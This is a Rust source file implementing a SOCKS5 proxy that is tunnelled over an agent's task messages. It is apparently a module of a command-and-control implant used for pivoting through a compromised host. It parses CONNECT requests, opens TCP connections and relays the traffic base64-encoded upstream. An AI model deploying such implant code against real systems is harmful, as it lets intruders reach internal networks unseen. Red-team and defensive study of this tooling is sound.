// socks.rs
use crate::agent::AgentTask;
use base64::{Engine as _, engine::general_purpose};
use once_cell::sync::Lazy;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::error::Error;
use std::io::{Read, Write};
use std::io::ErrorKind;
use std::net::{Ipv4Addr, Ipv6Addr, SocketAddr, TcpStream, ToSocketAddrs};
use std::sync::{mpsc, Arc, Mutex};
use std::time::Duration;

#[derive(Deserialize, Serialize, Debug, Clone)]
pub struct SocksMsg {
    pub exit: bool,
    pub server_id: u32,
    pub data: String,
}

// =========================
// Global SOCKS Queue
// =========================
pub static SOCKS_QUEUE: Lazy<Arc<Mutex<Vec<SocksMsg>>>> = Lazy::new(|| Arc::new(Mutex::new(Vec::new())));

#[derive(Debug)]
pub struct SocksState {
    pub connections: Arc<Mutex<HashMap<u32, TcpStream>>>,
}

impl SocksState {
    pub fn new() -> Self {
        Self {
            connections: Arc::new(Mutex::new(HashMap::new())),
        }
    }
}

// =========================
// Main SOCKS Thread
// =========================
pub fn start_socks(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let state = Arc::new(SocksState::new());

    loop {
        match rx.recv_timeout(Duration::from_secs(5)) {
            Ok(msg) => {
                if let Ok(task) = serde_json::from_value::<AgentTask>(msg) {
                    if task.command == "socks_data" {
                        if let Ok(msgs) = serde_json::from_str::<Vec<SocksMsg>>(&task.parameters) {
                            if let Err(e) = process_socks_messages(msgs, &state) {
                                eprintln!("SOCKS error: {e}");
                            }
                        }
                    }
                }
                // After handling inbound socks_data, flush any responses to the sender
                drain_socks_queue_and_send(tx);
            }
            Err(mpsc::RecvTimeoutError::Timeout) => {
                // Periodically flush any accumulated SOCKS responses even when idle
                drain_socks_queue_and_send(tx);
                continue;
            }
            Err(_) => break,
        }
    }
    Ok(())
}

// =========================
// SOCKS Message Processing
// =========================
fn process_socks_messages(
    msgs: Vec<SocksMsg>,
    state: &Arc<SocksState>,
) -> Result<(), Box<dyn Error>> {
    let mut conns = state.connections.lock().unwrap();
    let mut responses = Vec::new();

    for msg in msgs {
        if msg.exit {
            if let Some(mut stream) = conns.remove(&msg.server_id) {
                let _ = stream.shutdown(std::net::Shutdown::Both);
            }
            continue;
        }

        let data = general_purpose::STANDARD.decode(&msg.data).unwrap_or_default();
        if data.is_empty() {
            continue;
        }

        if let Some(stream) = conns.get_mut(&msg.server_id) {
            if stream.write_all(&data).is_err() {
                responses.push(SocksMsg {
                    exit: true,
                    server_id: msg.server_id,
                    data: String::new(),
                });
                conns.remove(&msg.server_id);
            } else {
                // Drain available data to reduce fragmentation
                let mut buf = [0u8; 4096];
                stream.set_read_timeout(Some(Duration::from_millis(100)))?;
                loop {
                    match stream.read(&mut buf) {
                        Ok(0) => {
                            responses.push(SocksMsg {
                                exit: true,
                                server_id: msg.server_id,
                                data: String::new(),
                            });
                            conns.remove(&msg.server_id);
                            break;
                        }
                        Ok(n) => {
                            responses.push(SocksMsg {
                                exit: false,
                                server_id: msg.server_id,
                                data: general_purpose::STANDARD.encode(&buf[..n]),
                            });
                            // Try to read again until timeout/WouldBlock
                            continue;
                        }
                        Err(e) => {
                            if e.kind() == ErrorKind::WouldBlock || e.kind() == ErrorKind::TimedOut {
                                break;
                            }
                            break;
                        }
                    }
                }
            }
        } else {
            if let Some((target_addr, response_data)) = handle_socks_connect(&data) {
                match TcpStream::connect(&target_addr) {
                    Ok(mut stream) => {
                        responses.push(SocksMsg {
                            exit: false,
                            server_id: msg.server_id,
                            data: general_purpose::STANDARD.encode(&response_data),
                        });

                        conns.insert(msg.server_id, stream.try_clone()?);

                        let mut buf = [0u8; 4096];
                        stream.set_read_timeout(Some(Duration::from_millis(100)))?;
                        loop {
                            match stream.read(&mut buf) {
                                Ok(0) => {
                                    responses.push(SocksMsg {
                                        exit: true,
                                        server_id: msg.server_id,
                                        data: String::new(),
                                    });
                                    conns.remove(&msg.server_id);
                                    break;
                                }
                                Ok(n) => {
                                    responses.push(SocksMsg {
                                        exit: false,
                                        server_id: msg.server_id,
                                        data: general_purpose::STANDARD.encode(&buf[..n]),
                                    });
                                    continue;
                                }
                                Err(e) => {
                                    if e.kind() == ErrorKind::WouldBlock || e.kind() == ErrorKind::TimedOut {
                                        break;
                                    }
                                    break;
                                }
                            }
                        }
                    }
                    Err(_) => {
                        let err_resp = build_socks5_error(0x05);
                        responses.push(SocksMsg {
                            exit: false,
                            server_id: msg.server_id,
                            data: general_purpose::STANDARD.encode(&err_resp),
                        });
                    }
                }
            } else {
                let err_resp = build_socks5_error(0x07);
                responses.push(SocksMsg {
                    exit: false,
                    server_id: msg.server_id,
                    data: general_purpose::STANDARD.encode(&err_resp),
                });
            }
        }
    }

    if !responses.is_empty() {
        let mut q = SOCKS_QUEUE.lock().unwrap();
        q.extend(responses);
    }

    Ok(())
}

// =========================
// SOCKS5 Parsing Helpers
// =========================
fn handle_socks_connect(data: &[u8]) -> Option<(SocketAddr, Vec<u8>)> {
    if data.len() < 10 {
        return None;
    }
    if data[0] != 0x05 || data[1] != 0x01 || data[2] != 0x00 {
        return None;
    }

    let atyp = data[3];
    let addr = match atyp {
        0x01 => {
            if data.len() < 10 {
                return None;
            }
            let ip = Ipv4Addr::new(data[4], data[5], data[6], data[7]);
            let port = u16::from_be_bytes([data[8], data[9]]);
            SocketAddr::from((ip, port))
        }
        0x03 => {
            let domain_len = data[4] as usize;
            if data.len() < 5 + domain_len + 2 {
                return None;
            }
            let domain = String::from_utf8_lossy(&data[5..5 + domain_len]);
            let port = u16::from_be_bytes([data[5 + domain_len], data[5 + domain_len + 1]]);
            let addr = (domain.as_ref(), port)
                .to_socket_addrs()
                .ok()?
                .next()?;
            addr
        }
        0x04 => {
            if data.len() < 22 {
                return None;
            }
            let mut octets = [0u8; 16];
            octets.copy_from_slice(&data[4..20]);
            let ip = Ipv6Addr::from(octets);
            let port = u16::from_be_bytes([data[20], data[21]]);
            SocketAddr::from((ip, port))
        }
        _ => return None,
    };

    let response = build_socks5_success(addr);
    Some((addr, response))
}

fn build_socks5_success(addr: SocketAddr) -> Vec<u8> {
    let mut res = vec![0x05, 0x00, 0x00];
    match addr {
        SocketAddr::V4(v4) => {
            res.push(0x01);
            res.extend_from_slice(&v4.ip().octets());
            res.extend_from_slice(&v4.port().to_be_bytes());
        }
        SocketAddr::V6(v6) => {
            res.push(0x04);
            res.extend_from_slice(&v6.ip().octets());
            res.extend_from_slice(&v6.port().to_be_bytes());
        }
    }
    res
}

fn build_socks5_error(code: u8) -> Vec<u8> {
    vec![0x05, code, 0x00, 0x01, 0, 0, 0, 0, 0, 0]
}

// =========================
// Outbound Queue Drainer
// =========================
fn drain_socks_queue_and_send(tx: &mpsc::Sender<serde_json::Value>) {
    // Drain the global queue and send a single aggregated message upstream
    let msgs: Vec<SocksMsg> = {
        let mut q = SOCKS_QUEUE.lock().unwrap();
        if q.is_empty() {
            return;
        }
        q.drain(..).collect()
    };

    if msgs.is_empty() {
        return;
    }

    let params = match serde_json::to_string(&msgs) {
        Ok(s) => s,
        Err(_) => String::from("[]"),
    };

    let payload = serde_json::json!({
        "command": "socks_data",
        "parameters": params,
    });

    let _ = tx.send(payload);
}
